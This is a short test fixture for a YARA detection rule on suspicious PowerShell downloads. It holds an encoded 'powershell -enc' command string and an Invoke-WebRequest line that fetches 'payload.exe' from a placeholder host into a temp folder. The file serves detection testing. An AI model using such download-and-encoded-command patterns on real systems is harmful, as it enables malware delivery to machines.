# This is a benign test file to verify YARA rule matching.
# It contains patterns that should trigger suspicious_powershell_download.
$cmd = "powershell -enc VGVzdGVzdGVzdGVzdGVzdGVzdGVzdGVzdGVzdGVzdGV="
Invoke-WebRequest -Uri "https://example.com/payload.exe" -OutFile "C:\temp\payload.exe"
